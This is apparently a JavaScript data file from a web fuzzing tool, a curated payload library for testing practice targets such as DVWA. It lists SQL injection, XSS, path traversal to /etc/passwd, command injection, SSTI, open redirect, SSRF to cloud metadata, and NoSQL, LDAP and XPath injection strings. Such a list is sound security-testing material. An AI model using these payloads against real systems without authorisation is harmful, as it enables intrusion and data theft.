// Curated built-in payload library. Committed to the repo so SmartFuzz works
// out of the box (PRD "zero training time / works out of the box") without
// cloning the multi-hundred-MB wordlist repos. `setup.js` can optionally clone
// SecLists / PayloadsAllTheThings / FuzzDB to scale this up, but everything
// here is enough to confirm the headline vulnerability classes on DVWA-class
// targets.
//
// Each entry: { type, value, source, categories[], tags[] }
//   type       — a key from @smartfuzz/shared vulnTypes
//   categories — parameter-classifier categories this payload suits
//   tags       — subtype / engine hints (e.g. 'error_based', 'mysql', 'time')

export const CURATED_PAYLOADS = [
  // ── SQL Injection ──
  { type: 'sqli', value: "'", source: 'custom', categories: ['NUMERIC_ID', 'SEARCH_FIELD', 'AUTH_FIELD', 'GENERIC'], tags: ['error_based', 'probe'] },
  { type: 'sqli', value: "''", source: 'custom', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['error_based'] },
  { type: 'sqli', value: "' OR '1'='1", source: 'seclists', categories: ['AUTH_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['boolean_based', 'auth_bypass'] },
  { type: 'sqli', value: "' OR 1=1 --", source: 'seclists', categories: ['AUTH_FIELD', 'NUMERIC_ID', 'GENERIC'], tags: ['boolean_based', 'auth_bypass'] },
  { type: 'sqli', value: "' OR 1=1 #", source: 'seclists', categories: ['AUTH_FIELD', 'NUMERIC_ID'], tags: ['boolean_based', 'mysql'] },
  { type: 'sqli', value: '1 OR 1=1', source: 'fuzzdb', categories: ['NUMERIC_ID'], tags: ['boolean_based', 'numeric'] },
  { type: 'sqli', value: "1' AND '1'='2", source: 'fuzzdb', categories: ['NUMERIC_ID', 'SEARCH_FIELD'], tags: ['boolean_based', 'false'] },
  { type: 'sqli', value: '" OR "1"="1', source: 'seclists', categories: ['AUTH_FIELD', 'GENERIC'], tags: ['boolean_based', 'double_quote'] },
  { type: 'sqli', value: "admin'--", source: 'seclists', categories: ['AUTH_FIELD'], tags: ['auth_bypass', 'comment'] },
  { type: 'sqli', value: "' UNION SELECT NULL--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'SEARCH_FIELD'], tags: ['union'] },
  { type: 'sqli', value: "' AND SLEEP(5)--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'SEARCH_FIELD', 'GENERIC'], tags: ['time_based', 'mysql', 'sleep'] },
  { type: 'sqli', value: "'; WAITFOR DELAY '0:0:5'--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'GENERIC'], tags: ['time_based', 'mssql'] },
  { type: 'sqli', value: "' OR pg_sleep(5)--", source: 'payloadsallthethings', categories: ['NUMERIC_ID', 'GENERIC'], tags: ['time_based', 'postgres'] },
  { type: 'sqli', value: "1) OR SLEEP(5)#", source: 'payloadsallthethings', categories: ['NUMERIC_ID'], tags: ['time_based', 'mysql'] },

  // ── Cross-Site Scripting ──
  { type: 'xss', value: '<script>alert(1)</script>', source: 'seclists', categories: ['SEARCH_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'basic'] },
  { type: 'xss', value: '"><script>alert(1)</script>', source: 'seclists', categories: ['SEARCH_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'attr_break'] },
  { type: 'xss', value: "'><script>alert(1)</script>", source: 'seclists', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['reflected', 'attr_break'] },
  { type: 'xss', value: '<img src=x onerror=alert(1)>', source: 'seclists', categories: ['TEXT_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['reflected', 'event_handler'] },
  { type: 'xss', value: '<svg/onload=alert(1)>', source: 'payloadsallthethings', categories: ['TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'svg'] },
  { type: 'xss', value: '<body onload=alert(1)>', source: 'payloadsallthethings', categories: ['TEXT_FIELD'], tags: ['reflected'] },
  { type: 'xss', value: 'javascript:alert(1)', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['reflected', 'protocol'] },
  { type: 'xss', value: '<iframe src=javascript:alert(1)>', source: 'payloadsallthethings', categories: ['TEXT_FIELD', 'GENERIC'], tags: ['reflected', 'iframe'] },

  // ── Path Traversal / LFI ──
  { type: 'path_traversal', value: '../../../../etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH', 'GENERIC'], tags: ['lfi', 'unix'] },
  { type: 'path_traversal', value: '../../../../../../etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'unix'] },
  { type: 'path_traversal', value: '....//....//....//etc/passwd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'filter_bypass'] },
  { type: 'path_traversal', value: '..%2f..%2f..%2fetc%2fpasswd', source: 'payloadsallthethings', categories: ['FILE_PATH'], tags: ['lfi', 'url_encoded'] },
  { type: 'path_traversal', value: '../../../../windows/win.ini', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'windows'] },
  { type: 'path_traversal', value: '..\\..\\..\\..\\windows\\win.ini', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'windows'] },
  { type: 'path_traversal', value: '/etc/passwd', source: 'fuzzdb', categories: ['FILE_PATH'], tags: ['lfi', 'absolute'] },

  // ── Command Injection ──
  { type: 'cmd_injection', value: '; id', source: 'payloadsallthethings', categories: ['COMMAND', 'GENERIC'], tags: ['unix', 'semicolon'] },
  { type: 'cmd_injection', value: '| id', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'pipe'] },
  { type: 'cmd_injection', value: '`id`', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'backtick'] },
  { type: 'cmd_injection', value: '$(id)', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'subshell'] },
  { type: 'cmd_injection', value: '; uname -a', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix'] },
  { type: 'cmd_injection', value: '& whoami', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['windows', 'amp'] },
  { type: 'cmd_injection', value: '| dir', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['windows', 'pipe'] },
  { type: 'cmd_injection', value: '; sleep 5', source: 'payloadsallthethings', categories: ['COMMAND'], tags: ['unix', 'time'] },

  // ── Server-Side Template Injection ──
  { type: 'ssti', value: '{{7*7}}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'TEXT_FIELD', 'GENERIC'], tags: ['probe', 'jinja', 'twig'] },
  { type: 'ssti', value: '${7*7}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['probe', 'freemarker', 'el'] },
  { type: 'ssti', value: '#{7*7}', source: 'payloadsallthethings', categories: ['SEARCH_FIELD', 'GENERIC'], tags: ['probe', 'ruby'] },
  { type: 'ssti', value: '{{7*7}}${7*7}', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['probe', 'polyglot'] },
  { type: 'ssti', value: '<%= 7*7 %>', source: 'payloadsallthethings', categories: ['GENERIC'], tags: ['probe', 'erb'] },

  // ── Open Redirect ──
  { type: 'open_redirect', value: 'https://evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['absolute'] },
  { type: 'open_redirect', value: '//evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['scheme_relative'] },
  { type: 'open_redirect', value: '/\\evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['backslash_bypass'] },
  { type: 'open_redirect', value: 'https:evil.example.com', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['no_slash'] },

  // ── SSRF ──
  { type: 'ssrf', value: 'http://127.0.0.1', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback'] },
  { type: 'ssrf', value: 'http://localhost', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback'] },
  { type: 'ssrf', value: 'http://169.254.169.254/latest/meta-data/', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['cloud_metadata', 'aws'] },
  { type: 'ssrf', value: 'http://[::1]', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback', 'ipv6'] },
  { type: 'ssrf', value: 'http://0.0.0.0', source: 'payloadsallthethings', categories: ['URL_FIELD'], tags: ['loopback'] },

  // ── NoSQL Injection ──
  { type: 'nosql_injection', value: '{"$gt":""}', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD', 'GENERIC'], tags: ['mongo', 'operator'] },
  { type: 'nosql_injection', value: '{"$ne":null}', source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'GENERIC'], tags: ['mongo', 'operator'] },
  { type: 'nosql_injection', value: "' || '1'=='1", source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['mongo', 'js'] },

  // ── LDAP Injection ──
  { type: 'ldap_injection', value: '*', source: 'fuzzdb', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['wildcard'] },
  { type: 'ldap_injection', value: '*)(uid=*', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter'] },
  { type: 'ldap_injection', value: '*)(&', source: 'payloadsallthethings', categories: ['AUTH_FIELD'], tags: ['filter'] },

  // ── XPath Injection ──
  { type: 'xpath_injection', value: "' or '1'='1", source: 'payloadsallthethings', categories: ['AUTH_FIELD', 'SEARCH_FIELD'], tags: ['boolean'] },
  { type: 'xpath_injection', value: "'] | //user/*['", source: 'payloadsallthethings', categories: ['SEARCH_FIELD'], tags: ['node'] },
];

export default CURATED_PAYLOADS;
